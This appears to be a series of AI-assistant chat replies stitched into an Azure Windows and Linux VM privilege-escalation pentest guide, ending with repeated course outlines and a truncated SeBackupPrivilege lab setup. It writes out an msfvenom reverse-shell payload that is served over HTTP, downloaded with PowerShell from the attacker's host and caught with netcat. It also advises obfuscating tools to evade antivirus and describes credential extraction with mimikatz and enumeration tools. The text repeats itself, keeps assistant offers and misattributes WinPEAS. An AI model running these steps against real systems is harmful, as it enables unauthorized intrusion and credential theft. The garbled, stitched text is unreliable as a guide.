When attacking a Linux VM, initial access typically yields a restricted
shell, often lacking full terminal functionality or root privileges.

- **Objective:** Elevate from a limited user shell to root.

- **Key activities include:**

  - Enumerating system details (kernel version, OS distribution,
    installed packages).

  - Reviewing file permissions, especially SUID/SGID binaries and
    writable directories.

  - Examining configuration files and logs (e.g., /etc/passwd,
    /etc/shadow, /var/log/).

  - Searching for sensitive credentials in configuration files or
    environment variables.

  - Checking for outdated or vulnerable software that can be exploited
    for escalation.

  - Inspecting cron jobs, systemd timers, or startup scripts for
    privilege abuse opportunities.

  - Leveraging known Linux privilege escalation techniques like
    exploiting SUID binaries, kernel exploits, or misconfigured sudo
    privileges.

Similar to Windows, Linux systems contain a vast number of files and
directories. Manual analysis is cumbersome; using automation tools like
LinPEAS, Linux Exploit Suggester, or custom Bash scripts can streamline
the discovery of privilege escalation paths.

------------------------------------------------------------------------

**Importance of Automation in Privilege Escalation**

The sheer scale and complexity of both Windows and Linux operating
systems make manual enumeration inefficient and error-prone. Automated
post-exploitation scripts:

- Rapidly gather critical system information.

- Identify common privilege escalation vulnerabilities and
  misconfigurations.

- Provide actionable insights to guide exploitation attempts.

- Save time during red team engagements or penetration tests, allowing
  deeper exploration of the compromised environment.

------------------------------------------------------------------------

**Summary**

Privilege escalation is a critical post-exploitation step in Azure VM
penetration testing. It involves systematically enumerating and
exploiting system weaknesses to gain higher privileges on both Windows
and Linux VMs. Leveraging automation tools and scripts is vital for
efficient and comprehensive privilege escalation, enabling attackers (or
penetration testers) to gain full control over the target system and
expand their foothold within the Azure environment.

------------------------------------------------------------------------

If you want, I can also suggest specific scripts/tools or commands for
privilege escalation on Azure VMs in both Windows and Linux
environments. Would you like that?

Certainly! Here’s a polished, comprehensive, and technically precise
rewrite of **Azure Windows VM Privilege Escalation** content tailored
for an Azure Cloud Penetration Test. I made sure to cover everything
clearly and professionally, suitable for a pen test report or playbook:

------------------------------------------------------------------------

**Azure Windows VM Privilege Escalation for Cloud Penetration Testing**

**Overview**

Privilege escalation on Azure Windows Virtual Machines (VMs) is a
critical phase during a penetration test to gain higher-level
permissions, enabling deeper system access, persistence, and lateral
movement. Azure Windows VMs often have cloud-specific configurations,
but core Windows privilege escalation techniques remain essential.

This document outlines the key vectors for Windows privilege escalation
in Azure environments, critical information to gather, and common
automated scripts/tools to assist pentesters in identifying privilege
escalation opportunities efficiently.

------------------------------------------------------------------------

**Privilege Escalation Vectors on Azure Windows VMs**

During penetration testing of Azure Windows VMs, the following vectors
should be thoroughly investigated to identify potential escalation
paths:

**1. Operating System Version and Patch Level**

- Enumerate OS version, edition, and patch level using commands like
  systeminfo or PowerShell (Get-ComputerInfo).

- Identify missing security patches or vulnerable Windows versions with
  publicly known exploits.

**2. Installed and Running Vulnerable Software Packages**

- Check installed software and running services for known
  vulnerabilities.

- Use wmic product get name,version or PowerShell to list installed
  applications.

- Focus on outdated or misconfigured software (e.g., outdated SQL
  Server, IIS, or third-party tools).

**3. File and Folder Permissions**

- Identify files and directories where the current user or
  low-privileged groups have **Full Control** or **Modify** access.

- Use tools or PowerShell scripts (icacls) to list ACLs on sensitive
  system files, configuration files, or scripts.

- Misconfigured permissions can allow arbitrary file replacement or code
  execution.

**4. Mapped Network Drives**

- Enumerate mapped drives and network shares (net use).

- Sensitive data or credentials stored on accessible shares can assist
  escalation.

**5. Potentially Interesting Files**

- Search for plaintext passwords, private keys, configuration files, or
  scripts stored locally.

- Look into user profiles, desktop, downloads, and temp folders for
  sensitive data.

**6. Unquoted Service Paths**

- Services with unquoted executable paths may be vulnerable to path
  hijacking.

- Use wmic service get name,pathname,startmode \| findstr /i "Auto" or
  automated scripts to identify services with unquoted paths.

**7. Network Configuration and Information**

- Collect network interfaces, routing tables, ARP cache, and open
  connections (ipconfig /all, netstat -ano, arp -a).

- This helps understand network topology and potential lateral movement
  paths.

**8. Firewall Status and Rules**

- Enumerate Windows Firewall state and inbound/outbound rules (netsh
  advfirewall firewall show rule name=all).

- Misconfigured firewall rules can expose services vulnerable to
  exploitation.

**9. Running Processes and Services**

- List running processes (tasklist, Get-Process) and identify any
  running with SYSTEM or elevated privileges.

- Investigate suspicious or vulnerable services that can be exploited.

**10. AlwaysInstallElevated Registry Key**

- Check if Windows Installer privilege escalation is possible by
  verifying the AlwaysInstallElevated registry key.

- Command:

- reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v
  AlwaysInstallElevated

- reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v
  AlwaysInstallElevated

- If enabled, untrusted MSI packages can be installed with elevated
  privileges.

**11. Stored Credentials**

- Look for cached or stored credentials using tools like mimikatz.

- Extract credentials from memory, Windows Vault, Credential Manager, or
  browser password stores.

**12. DLL Hijacking**

- Identify binaries that load DLLs insecurely (without specifying full
  paths).

- Malicious DLLs placed in a higher-priority path can be loaded with
  elevated privileges.

**13. Scheduled Tasks**

- Enumerate scheduled tasks (schtasks /query /fo LIST /v).

- Misconfigured tasks running with SYSTEM privileges or tasks pointing
  to writable executables/scripts can be exploited for privilege
  escalation.

------------------------------------------------------------------------

**Automation: Privilege Escalation Discovery Scripts**

Numerous open-source and built-in scripts facilitate rapid discovery of
privilege escalation vectors:

- **PowerUp.ps1 (PowerShell)**\
  A popular post-exploitation script from PowerSploit suite that
  automates checks for common privilege escalation weaknesses including
  permissions, service configurations, and registry keys.

- **WinPEAS (Windows Privilege Escalation Awesome Script)**\
  A comprehensive enumeration tool that scans for vulnerabilities,
  misconfigurations, and sensitive information.

- **Sherlock**\
  Focuses on finding local privilege escalation vulnerabilities in
  Windows operating systems.

- **SharpUp**\
  A C# tool similar to PowerUp, usable in environments where PowerShell
  is restricted.

- **Custom PowerShell/Batch scripts**\
  Custom scripts leveraging built-in cmdlets and commands to gather
  specific system info or to check for known misconfigurations.

------------------------------------------------------------------------

**Summary**

Effective privilege escalation in Azure Windows VMs requires detailed
enumeration of system information, permissions, configurations, and
running services. Automated scripts accelerate the discovery process but
must be combined with manual analysis and exploitation techniques to
confirm and leverage findings.

Privilege escalation findings should be documented with the specific
vectors, exploited misconfigurations, and remediation recommendations to
improve security posture.

------------------------------------------------------------------------

If you'd like, I can also help with sample commands or a step-by-step
usage guide for these scripts/tools in Azure environments. Would you
like me to include that?

Certainly! Here’s a fully rewritten and polished version of your **Azure
Windows VM Privilege Escalation** section for Azure Cloud Penetration
Testing. It is clear, professional, and detailed to cover everything
without missing any important point.

------------------------------------------------------------------------

**Azure Windows VM Privilege Escalation for Cloud Penetration Testing**

**Getting Access to the Windows Machine**

Before diving into privilege escalation enumeration, it’s important to
establish initial access to the target Azure Windows VM. This step is
essential for beginners or when you are starting a post-exploitation
session from scratch. If you already have access via another exploit or
method, you may skip this section.

**Initial Access via Payload Execution**

A common approach to gain access is by crafting a reverse shell payload
using **MSFvenom**:

- We typically use the windows/x64/shell_reverse_tcp payload to get a
  raw shell upon execution, rather than a Meterpreter session
  (Meterpreter usage will be discussed later).

- When crafting the payload, specify your **local IP address** and
  **listening port** to receive the shell.

- The payload format is set as a Windows executable (.exe).

- Example MSFvenom command:

- msfvenom -p windows/x64/shell_reverse_tcp LHOST=\<your_local_ip\>
  LPORT=\<your_port\> -f exe -o shell.exe

- After generating the executable payload, host it on a simple HTTP
  server for download on the target machine:

- python3 -m http.server 80

- On the compromised Windows machine, download the payload using
  PowerShell’s Invoke-WebRequest:

- powershell.exe -Command "Invoke-WebRequest -Uri
  http://\<your_local_ip\>/shell.exe -OutFile C:\Temp\shell.exe"

- Start a **Netcat** listener on your local machine on the specified
  port:

- nc -lvnp \<your_port\>

- Execute the downloaded payload on the target system:

- C:\Temp\shell.exe

- You will receive a shell session on your listener.

------------------------------------------------------------------------

**Privilege Escalation Enumeration: Using WinPEAS**

One of the most comprehensive and user-friendly tools for Windows
privilege escalation enumeration is **WinPEAS**, developed by Carlos
Perez.

**About WinPEAS**

- WinPEAS is designed to automate the discovery of privilege escalation
  vectors on Windows systems.

- It is available as an executable or batch file on GitHub. The source
  code is open and requires **.NET Framework 4.5 or higher**.

- The executable version is recommended for ease of use and reliability.

- You can also obfuscate the source code to evade detection by antivirus
  or endpoint protection.

- WinPEAS outputs color-coded results to quickly highlight important
  findings:

  - **Red**: Potential privilege escalation vectors or special
    privileges detected.

  - **Green**: Security features or protections enabled.

  - **Cyan**: Active users.

  - **Blue**: Disabled users.

  - **Yellow**: Hyperlinks or references.

- The tool’s functionality is heavily based on the older but popular
  **Seatbelt** enumeration script.

**What WinPEAS Checks**

WinPEAS performs extensive checks in multiple categories, including:

- **System Information**

  - OS details, system environment variables, installed Microsoft
    updates

  - LSA protection, Credential Guard status, WDigest, cached credentials
    count

  - Antivirus and Windows Defender status

  - User Account Control (UAC) configuration

  - NTLM settings, Local Group Policy, AppLocker configurations and
    bypass suggestions

  - Printer settings, named pipes, AMSI providers, Sysmon presence,
    installed .NET versions

- **User Information**

  - Users and groups enumeration, current user token privileges

  - Clipboard contents, logged-in users, RDP sessions

  - Autologin credentials, home directories, password policies

  - User logon sessions and authentication tokens

- **Services Information**

  - Non-Microsoft services, modifiable services, services with writable
    binary paths

  - Unquoted service paths leading to DLL hijacking opportunities

- **Applications Information**

  - Active window, installed software, autoruns, scheduled tasks, device
    drivers

- **Network Information**

  - Network shares, mapped drives via WMI, hosts file, network
    interfaces

  - Listening ports, firewall rules, DNS cache, Internet Explorer
    settings

- **Windows Credentials**

  - Windows Vault and Credential Manager entries

  - Saved RDP settings and recently executed commands

  - DPAPI keys, Remote Desktop Connection Manager credentials, Kerberos
    tickets

  - Wi-Fi credentials, security package credentials

  - Presence of the AlwaysInstallElevated registry key

  - WSUS (Windows Server Update Services) configuration

- **Browser Information**

  - Credential databases and history for Firefox, Chrome, Opera, Brave,
    and Internet Explorer

  - Extracted saved passwords and active browser sessions

- **Interesting Files and Registry Entries**

  - PuTTY sessions and SSH host keys

  - Office 365 synced endpoints and OneDrive configs

  - SSH keys stored in the registry

  - Backup files (SAM & SYSTEM), cached Group Policy Preferences (GPP)
    passwords

  - Password files in recycle bin, user documents, Oracle SQL Developer
    configs

  - Slack files, Outlook download folders, certificates

  - Executable files in writable or non-default folders

  - Windows Subsystem for Linux (WSL) checks

- **Events Information**

  - Logon, explicit logon, process creation, PowerShell, power on/off
    events

- **Additional Checks**

  - Lookup for LOLBAS (Living Off The Land Binaries and Scripts)

  - Execution of Linux privilege escalation script (linpeas.sh) if WSL
    is present

------------------------------------------------------------------------

**Using WinPEAS in an Azure Windows VM Environment**

1.  Download the WinPEAS executable on your local machine:

    - GitHub: <https://github.com/carlospolop/PEASS-ng/releases>

2.  Host the executable using a simple HTTP server:

3.  python3 -m http.server 80

4.  On the compromised Azure Windows VM, create a temporary directory
    and download WinPEAS using PowerShell:

5.  mkdir C:\Temp

6.  powershell.exe -Command "Invoke-WebRequest -Uri
    http://\<your_local_ip\>/winPEAS.exe -OutFile C:\Temp\winPEAS.exe"

7.  Run WinPEAS from the shell:

8.  C:\Temp\winPEAS.exe

9.  Review the color-coded output carefully for indications of privilege
    escalation vectors.

------------------------------------------------------------------------

**Summary**

Privilege escalation on Azure Windows VMs starts with establishing a
foothold, commonly via reverse shell payloads. Following initial access,
automated tools like **WinPEAS** provide extensive, quick, and
color-coded enumeration of potential escalation vectors, including
service misconfigurations, credential exposures, permission weaknesses,
and network information.

Combining WinPEAS output with manual verification allows penetration
testers to identify and exploit Windows privilege escalation paths
effectively in Azure environments.

------------------------------------------------------------------------

If you want, I can also provide detailed usage instructions for
Meterpreter, other enumeration tools, or common privilege escalation
exploits next! Would you like that?

Certainly! Here’s a polished, comprehensive, and corrected rewrite of
your **Azure Windows VM Privilege Escalation** section, fully capturing
all the key points without missing anything:

------------------------------------------------------------------------

**Azure Windows VM Privilege Escalation**

After successfully gaining access to an Azure Windows VM, the next
critical phase is privilege escalation enumeration. Automated tools such
as **WinPEAS** provide a detailed insight into system configurations,
user credentials, network settings, and potential weaknesses that can be
exploited to elevate privileges.

------------------------------------------------------------------------

**WinPEAS Enumeration Highlights and Analysis**

**Clipboard Data Inspection**

WinPEAS begins by enumerating the clipboard contents on the target
machine. In modern environments where password managers are common, it
is highly likely that users may have copied sensitive credentials to the
clipboard during their session. Such data lingering in the clipboard
poses a serious security risk and can be leveraged for account
compromise. This underscores the importance of enforcing **Multi-Factor
Authentication (2FA)** to mitigate damage from credential theft.

------------------------------------------------------------------------

**User Sessions and Home Folders**

- WinPEAS identifies that **two users are currently logged in** on the
  target system.

- It enumerates user accounts and inspects the contents of their
  respective **home folders**.

- The tool attempts to access other users’ home directories to assess
  permission levels and potential credential exposure.

- Notably, WinPEAS successfully extracts the **Auto Logon password** for
  the user named "user", which indicates that automatic logon is enabled
  and credentials are stored insecurely.

------------------------------------------------------------------------

**Password Policies and User Account Status**

- WinPEAS evaluates the **password policies** enforced on the system.

- It reports which users have **not changed their passwords for extended
  periods**, revealing accounts that may be vulnerable due to stale
  credentials.

- It also details the **password length** policies, helping to identify
  accounts with weak or insufficient password requirements.

------------------------------------------------------------------------

**Network Shares and Configurations**

- The tool enumerates **network shares** accessible on the machine.

- It inspects local **network configurations** including IP addresses
  and interfaces.

- WinPEAS checks for **open local ports** and running network services,
  revealing potential services that may be exploited or misconfigured.

------------------------------------------------------------------------

**Interesting Files and Registry Values**

WinPEAS thoroughly scans the file system and registry for sensitive or
exploitable artifacts:

- Extracted credentials from **PuTTY sessions**, including saved
  passwords.

- Identification and extraction of stored **public SSH keys**.

- Enumeration of the **Security Account Manager (SAM)** database for
  possible credential hashes or plaintext secrets.

- Detection of encrypted passwords stored in XML configuration files
  such as **Unattend.xml**, which can contain sensitive setup
  credentials.

- These files and registry entries may contain reusable credentials or
  configuration errors that enable privilege escalation or lateral
  movement.

------------------------------------------------------------------------

**Summary**

WinPEAS automates a vast range of privilege escalation checks on Azure
Windows VMs, revealing sensitive data such as clipboard contents, stored
credentials, password policies, network shares, and system
configurations. Each finding—such as cached passwords, autologon
secrets, and stale user accounts—represents a potential vector for
privilege escalation.

For defenders, enforcing multi-factor authentication, regular password
updates, and minimizing stored credentials can reduce risk. For
penetration testers, tools like WinPEAS are indispensable for quickly
mapping privilege escalation paths during Azure Cloud penetration tests.

------------------------------------------------------------------------

If you'd like, I can help with detailed exploitation examples based on
these enumeration results or recommend complementary tools to expand
your assessment. Would you like that?

Certainly! Here's a polished, comprehensive rewrite of your **Azure
Windows VM Privilege Escalation - Seatbelt** section for Azure Cloud
penetration testing, with clarity and technical accuracy preserved:

------------------------------------------------------------------------

**Azure Windows VM Privilege Escalation: Seatbelt**

**Overview**

In addition to **WinPEAS**, the **Seatbelt** project is another powerful
enumeration tool for Windows privilege escalation assessments. Seatbelt
is written in C# and provides comprehensive system information relevant
to identifying privilege escalation vectors. Unlike WinPEAS, Seatbelt
does not provide precompiled executables; you must **build the binary
yourself**, which is recommended to avoid using potentially tampered
executables from untrusted sources.

------------------------------------------------------------------------

**Building Seatbelt**

1.  **Download the source code** from the official Seatbelt GitHub
    repository.

2.  Open **Visual Studio Community Edition** (free).

3.  Select **"Open a Project or Solution"** and navigate to the
    Seatbelt.sln solution file.

4.  Once loaded, from the top menu bar, click **Build** \> **Build
    Solution**.

5.  After the build completes, check the **Output** window for the
    location of the generated executable (Seatbelt.exe).

------------------------------------------------------------------------

**Deploying Seatbelt on the Target Machine**

After building the executable and obtaining a remote session on the
Windows machine (via any exploitation method), transfer Seatbelt.exe to
the target. This can be done using:

- impacket-smbserver to serve files via SMB:

- impacket-smbserver share \$(pwd) -smb2support

- Then on the target machine:

- copy \\\<attacker-ip\>\share\Seatbelt.exe C:\Temp\\

------------------------------------------------------------------------

**Running Seatbelt**

Seatbelt supports enumerating system data by groups or running all
checks at once.

- To run all enumerations:

- Seatbelt.exe -group=all

This command triggers a full system scan covering a broad spectrum of
information relevant to privilege escalation.

------------------------------------------------------------------------

**Key Enumeration Categories by Seatbelt**

Seatbelt enumerates various system aspects, including but not limited
to:

- **Security and Protection Configurations**

  - Antivirus status and details

  - AppLocker policies and bypass potential

  - Credential Guard configuration

  - Local Group Policy settings

  - Audit policies (classic and advanced)

- **Network Information**

  - ARP tables and network adapters

  - DNS cache entries

  - Proxy and internet zone configurations

- **User and Session Information**

  - Local user accounts, including status (active/disabled)

  - User group memberships

  - Logon events (Event IDs 4624 and 4648 for explicit logon)

  - Windows logon sessions

- **Credential and Secret Artifacts**

  - Cloud credential files for AWS, Google Cloud, Azure, Bluemix

  - Office 365 endpoints synced by OneDrive

  - DPAPI master keys

  - KeePass configuration files

  - Browser bookmarks and history (Chrome, Edge, Brave, Opera)

  - FileZilla configuration files

- **System and Environment Details**

  - Installed hotfixes and patches

  - .NET Framework versions

  - Current environment variables and %PATH% folders

  - Running processes of interest, including admin tools and defensive
    products

  - Explorer recent files and run commands history

  - Living Off The Land Binaries and Scripts (LOLBAS)

- **Autorun and Persistence Mechanisms**

  - Auto-run executables, scripts, and programs configured in the system

------------------------------------------------------------------------

**Example Usage and Output**

When running Seatbelt with the -group=all option, it thoroughly
enumerates the above areas. For example, it detects **Auto Logon
credentials**, which were also identified earlier by WinPEAS, confirming
the presence of stored plaintext or recoverable credentials that could
be leveraged for privilege escalation.

------------------------------------------------------------------------

**Summary**

Seatbelt is an essential tool for Azure Windows VM penetration tests,
complementing tools like WinPEAS by providing deep visibility into
system security posture, user activity, credentials, and configuration
weaknesses. Building the tool yourself ensures trustworthiness, and its
rich output facilitates identifying privilege escalation paths and
potential security misconfigurations in Azure environments.

------------------------------------------------------------------------

If you want, I can assist you with automating Seatbelt deployments or
analyzing specific outputs for exploitation strategies. Would you like
that?

Certainly! Here’s a clean, well-structured, and corrected rewrite of
your **Azure Windows VM Privilege Escalation** section for Azure Cloud
Penetration Testing. It includes all important details and tools, with
clearer explanations and polished language:

------------------------------------------------------------------------

**Azure Windows VM Privilege Escalation for Cloud Penetration Testing**

Privilege escalation on Azure Windows Virtual Machines is a critical
post-exploitation phase in cloud penetration testing. Below are some
essential tools and techniques to identify and exploit common
misconfigurations and weaknesses that allow elevation of privileges on
Windows VMs running in Azure environments.

------------------------------------------------------------------------

**SharpUp**

- **Description:**\
  SharpUp is a C# tool developed by Harmj0y that automates local
  privilege escalation enumeration on Windows systems. It leverages
  functionality from the PowerUp tool (a PowerShell script discussed
  later) to identify potential escalation vectors.

- **Capabilities:**\
  SharpUp scans for:

  - Modifiable Windows services and binaries

  - AlwaysInstallElevated registry keys

  - Modifiable folders in the system %PATH%

  - Modifiable autorun registry keys

  - Special user privileges

  - McAfee Sitelist.xml file weaknesses

- **Usage:**\
  Since no precompiled binaries are officially available, build the
  executable from source similarly to Seatbelt. Transfer the compiled
  SharpUp.exe to the target machine (e.g., via HTTP server and
  Invoke-WebRequest in PowerShell):

- python -m http.server 80

- powershell.exe -Command "Invoke-WebRequest -Uri
  http://\<attacker-ip\>/SharpUp.exe -OutFile C:\Temp\SharpUp.exe"

Then execute it from the terminal to enumerate privilege escalation
opportunities.

------------------------------------------------------------------------

**JAWS (Just Another Windows (Enum) Script)**

- **Description:**\
  JAWS is a comprehensive PowerShell enumeration script compatible with
  Windows 7 and later (runs on PowerShell 2.0). It collects detailed
  system information useful for privilege escalation and
  post-exploitation.

- **Capabilities:**\
  JAWS enumerates:

  - Network information (interfaces, ARP cache, netstat)

  - Firewall status and rules

  - Running processes

  - Files and folders with full or modify access permissions

  - Mapped network drives

  - Potentially interesting files and installed applications

  - Unquoted service paths

  - Recent documents

  - System install files

  - AlwaysInstallElevated registry keys

  - Stored credentials and auto logon details

  - Potentially vulnerable services

  - MUICache files (used for storing recently run commands)

  - Scheduled tasks

- **Usage:**\
  Ensure the PowerShell execution policy allows script execution:

- powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1

------------------------------------------------------------------------

**PowerUp**

- **Description:**\
  PowerUp is a popular PowerShell script for identifying Windows
  privilege escalation vulnerabilities and exploits. It automates
  checking multiple common vectors.

- **Capabilities:**\
  PowerUp scans for:

  - Token manipulation and token abuse opportunities

  - Vulnerable services that can be modified or hijacked

  - DLL hijacking possibilities

  - Registry misconfigurations

  - Unquoted service paths and other common weaknesses

- **Usage:**\
  Transfer PowerUp.ps1 to the target system. Use PowerShell to bypass
  the execution policy, import the module, and run all checks:

- powershell -ExecutionPolicy Bypass

- Import-Module .\PowerUp.ps1

- Invoke-AllChecks

Optionally, generate an HTML report using the -HTMLReport flag.

------------------------------------------------------------------------

**Powerless**

- **Description:**\
  Powerless is a batch script designed for legacy Windows environments
  where PowerShell is restricted or unavailable, and execution of
  binaries is limited. It helps enumerate privilege escalation vectors
  using basic Windows commands.

- **Capabilities:**\
  Provides information on directories, services, and other system
  settings that can be leveraged for privilege escalation.

- **Usage:**\
  Transfer the batch file to the target machine and execute it directly.
  No dependencies on PowerShell make it useful in locked-down
  environments.

------------------------------------------------------------------------

**PrivescCheck**

- **Description:**\
  PrivescCheck is a lightweight PowerShell script designed for fast
  enumeration of local privilege escalation weaknesses on Windows
  systems. It requires minimal dependencies, making it suitable for
  environments with AppLocker or application whitelisting.

- **Capabilities:**

  - Enumerates vulnerable services and their permissions

  - Checks if the current user has access rights to services

  - Avoids using WMI to bypass admin-only restrictions

  - Provides an easy-to-read report sorted by risk level

- **Usage:**\
  Transfer the script to the target VM and run with execution policy
  bypass:

- powershell -ExecutionPolicy Bypass -Command ". .\PrivescCheck.ps1;
  Invoke-PrivescCheck"

------------------------------------------------------------------------

**Summary**

When performing privilege escalation on Azure Windows VMs during
penetration testing:

- Use **SharpUp** and **PowerUp** for comprehensive automated
  enumeration of common Windows privilege escalation vectors.

- Use **JAWS** for deep system enumeration that also includes network
  and firewall information.

- Use **Powerless** for legacy or restricted environments where
  PowerShell or executables are limited.

- Use **PrivescCheck** for fast, low-dependency checks in tightly
  controlled environments.

Always transfer these tools carefully, bypass PowerShell execution
policies as needed, and review their output for exploitable
misconfigurations, vulnerable services, unquoted paths, and stored
credentials that can lead to privilege escalation.

------------------------------------------------------------------------

If you want, I can also help prepare scripts or commands to automate
these transfers and executions during your Azure VM pentest. Would you
like that?

Certainly! Here's a rewritten, polished, and corrected comprehensive
guide on **Azure Windows VM Privilege Escalation for Azure Cloud
Penetration Testing** that retains all essential details and improves
clarity, flow, and accuracy:

------------------------------------------------------------------------

**Azure Windows VM Privilege Escalation for Azure Cloud Penetration
Testing**

Privilege escalation on Azure Windows VMs is a critical phase during
penetration testing to gain higher privileges such as SYSTEM or
Administrator rights. Several tools and techniques exist to automate
vulnerability discovery and exploitation. Below is a detailed guide
covering popular tools and methods used in real-world Azure pentests.

------------------------------------------------------------------------

**1. Metasploit Framework**

When you have access to a **meterpreter shell** on the target Azure
Windows VM, Metasploit offers powerful post-exploitation modules to help
enumerate and escalate privileges.

- Metasploit's **post-exploitation modules** can scan the target for
  known privilege escalation vulnerabilities.

- The **meterpreter** shell allows you to load PowerShell and execute
  enumeration scripts directly.

------------------------------------------------------------------------

**2. Sherlock**

Sherlock is a well-known PowerShell script designed to identify
potential privilege escalation vectors on Windows machines.

- Metasploit now includes Sherlock in its post-exploitation framework.

- To run Sherlock via a meterpreter shell:

meterpreter \> load powershell

meterpreter \> powershell_import /root/Sherlock.ps1

meterpreter \> powershell_execute "find-allvulns"

- Sherlock scans for vulnerabilities and outputs probable exploits
  including relevant CVE details.

- Requires PowerShell availability on the target system.

------------------------------------------------------------------------

**3. WinPEAS, SharpUp, and Seatbelt**

These are comprehensive Windows privilege escalation enumeration tools,
widely used to identify misconfigurations and vulnerabilities.

**Execution workflow from Meterpreter shell:**

meterpreter \> mkdir privs

meterpreter \> cd privs

meterpreter \> upload /root/Downloads/WinPEAS.exe

meterpreter \> upload /root/Downloads/SharpUp.exe

meterpreter \> upload /root/Downloads/Seatbelt.exe

meterpreter \> shell

C:\privs\> WinPEAS.exe

C:\privs\> SharpUp.exe

C:\privs\> Seatbelt.exe

- **WinPEAS** outputs detailed system info, including virtualization
  status, OS build, installed patches, and detected privilege escalation
  exploits.

- **SharpUp** is a C# tool focusing on Windows-specific privilege
  escalation vectors.

- **Seatbelt** collects security-related configuration and audit data.

------------------------------------------------------------------------

**4. PowerShell Empire Modules**

PowerShell Empire is a popular post-exploitation framework leveraging
PowerShell agents on compromised hosts. It includes built-in privilege
escalation modules.

**Using WinPEAS inside PowerShell Empire:**

usemodule privesc/WinPEAS

execute

- Enumerates network interfaces, TCP connections, group policies, cached
  credentials, and potential secrets or credential files.

**Using PowerUp module in PowerShell Empire:**

usemodule privesc/powerup/allchecks

execute

- Performs extensive checks including auto-logon credentials, autorun
  configurations, scheduled tasks, and more.

- Faster and more stable when executed within Empire agents.

**Sherlock module in PowerShell Empire:**

usemodule privesc/Sherlock

execute

- Scans for privilege escalation vulnerabilities similar to the
  standalone Sherlock script but executed via Empire.

**Watson module in PowerShell Empire:**

usemodule privesc/watson

execute

- Enumerates vulnerabilities based on Windows build number and returns
  CVE IDs for known privilege escalation exploits.

**Privesccheck module in PowerShell Empire:**

usemodule privesc/privesccheck

execute

- Checks various Windows services and access rights to identify
  exploitable privilege escalation paths.

- Tests if the current user can access vulnerable services.

------------------------------------------------------------------------

**Summary and Recommendations**

- Always **start with enumeration tools** such as WinPEAS, SharpUp,
  Seatbelt, Sherlock, and PowerUp to identify privilege escalation
  vectors.

- When working with **meterpreter shells**, upload and execute Windows
  binaries or PowerShell scripts for efficient enumeration.

- When operating through **PowerShell Empire agents**, leverage the
  integrated modules (WinPEAS, PowerUp, Sherlock, Watson, Privesccheck)
  for streamlined execution.

- Pay close attention to **Windows build numbers**, **patch levels**,
  and **service permissions**, which are critical indicators of
  exploitable vulnerabilities.

- Use the CVE details provided by these tools to identify known exploits
  and craft privilege escalation exploits accordingly.

# Privilege Escalation

Privilege escalation aims to gain unauthorized elevated access within a
system. This involves exploiting system vulnerabilities,
misconfigurations, or weak permissions.

**Key Techniques**

- **Scheduled Tasks:** Abusing misconfigured tasks to execute code with
  higher privileges.

- **Weak Services:** Exploiting insecure service properties, unquoted
  paths, weak registry permissions, or vulnerabilities in service
  executables.

- **Kernel Exploits:** Leveraging vulnerabilities in the Windows kernel
  to gain system-level access.

- **Logon Autostart Execution:** Utilizing registry keys or startup
  folders to execute code at system startup.

- **Password Hunting:** Searching for stored passwords in the registry,
  configuration files, or using brute force attacks.

- **ACL Bypass:** Overcoming access control lists through techniques
  like SeBackupPrivilege, SeRestorePrivilege, token impersonation, or
  Hive Nightmare.

- 

- Kernel

- Bypass UAC

- Unquoted Path

- Scheduled Task

- Automated Script

- Types of Privilege Escalation

- ACL Permissions

- Mitre ID T1547

**Additional Considerations**

- **Understanding ACL permissions:** Knowledge of Access Control Lists
  is crucial for identifying potential vulnerabilities.

- **MITRE ATT&CK T1547:** Familiarization with this technique ID can
  provide valuable insights into attacker behaviours.

**Detection and Mitigation**

Regular system audits, patching vulnerabilities, implementing strong
password policies, and limiting user privileges are essential for
preventing privilege escalation attacks.

**Conclusion**

Privilege escalation is a complex challenge requiring a deep
understanding of Windows internals and attack methodologies. By
mastering these techniques and implementing robust security measures,
organizations can significantly reduce the risk of unauthorized access.

 

## Scheduled tasks exploitation

- Task Scheduler

- Misconfigured Scheduled Task/Job

- Abusing Scheduled Task/Job

- Detection & Mitigation

## RBAC weakness

- Insecure Service Properties

- Unquoted Service Path

- Weak Registry Permissions

- Insecure Service Executables

- Insecure GUI Apps

  - Bypass UAC

## Kernel exploits

- What is kernel

- Compiling exploit code

- Enumerating missing patches

- Kernel exploit hunting

## Logon autostart execution

- Run Registry key

- Always Install Elevated

- Startup Folder

## Passwords Hunting

- Registry

- Brute force

- Credential Manager (run as)

- Configuration File

## Bypass ACL

- SeBackupPrivilege

- SeRestorePrivilege

- Token Impersonation (Hot/Rotten/Juicy Potato/Printspoofer)

- Hive Nightmare

## Windows Privilege Escalation

**Windows Privilege Escalation**

- Kernel

- Bypass UAC

- Unquoted Path

- Scheduled Task

- Automated Scrip

**Introduction & Lab Setup**

- Types of Privilege Escalation

- ACL Permissions

- Mitre ID T1547

**Exploiting Scheduled Tasks**

- Task Scheduler

- Misconfigured Scheduled Task/Job

- Abusing Scheduled Task/Job

- Detection & Mitigation

**Weak Services/Permissions**

- Insecure Service Properties

- Unquoted Service Path

- Weak Registry Permissions

- Insecure Service Executables

- Insecure GUI Apps

**Kernel Exploits**

- What is kernel

- Compiling exploit code

- Enumerating missing patches

- Kernel exploit hunting

**Logon Autostart Execution**

- Run Registry key

- Always Install Elevated

- Startup Folder

**Passwords Hunting**

- Registry

- Brute force

- Credential Manager (run as)

- Configuration File

**Bypass ACL/UAC**

- SeBackupPrivilege

- SeRestorePrivilege

- Token Impersonation (Hot/Rotten/Juicy Potato/Printspoofer)

- Hive Nightmare

## Privilege Escalation

Certainly! Here's a **corrected and concise summary** of your Azure
Windows VM penetration testing scenario focused on exploiting
**SeBackupPrivilege** for privilege escalation:

**Azure Windows VM Pentest: Exploiting SeBackupPrivilege for Privilege
Escalation**

**Introduction**

- **SeBackupPrivilege** is a Windows privilege intended to allow users
  to back up files regardless of file permissions.

- It grants **read access to all files** on the system, including
  sensitive files like the SAM and SYSTEM registry hives.

- Attackers can exploit this privilege **after initial access** to read
  these sensitive files and extract password hashes for privilege
  escalation.

**Setup Environment (Windows 10 VM)**

1.  **Create a new user** to assign the privilege:

2.  net user aarti 123 /add

3.  **Enable WinRM and PowerShell Remoting** to allow remote access:

4.  powershell -ep bypass

5.  Enable-PSRemoting -Force

6.  **Install and import the Carbon PowerShell module** (for privilege
    management):

7.  Install-Module -Name Carbon -Force

8.  Import-Module Carbon

9.  **Grant SeBackupPrivilege to the new user:**

10. Grant-CPrivilege -Identity aarti -Privilege SeBackupPrivilege

11. **Verify privilege assignment:**

